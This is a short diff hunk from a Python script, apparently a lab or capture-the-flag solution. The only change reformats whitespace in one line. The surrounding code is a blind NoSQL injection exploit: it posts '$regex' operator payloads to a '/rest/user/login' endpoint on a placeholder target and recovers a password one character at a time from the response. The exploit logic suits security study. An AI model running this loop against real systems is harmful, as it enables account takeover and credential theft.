@@ -76,7 +76,7 @@ chars = string.ascii_lowercase + string.digits
 password = ""
 for i in range(40):
     for c in chars:
-        payload = {"email":"user@example.com","password":{"$regex":f"^{password}{c}.*"}}
+        payload = {"email": "user@example.com", "password": {"$regex": f"^{password}{c}.*"}}
         r = requests.post("http://<target>/rest/user/login", json=payload)
         if '"authentication"' in r.text:
             password += c
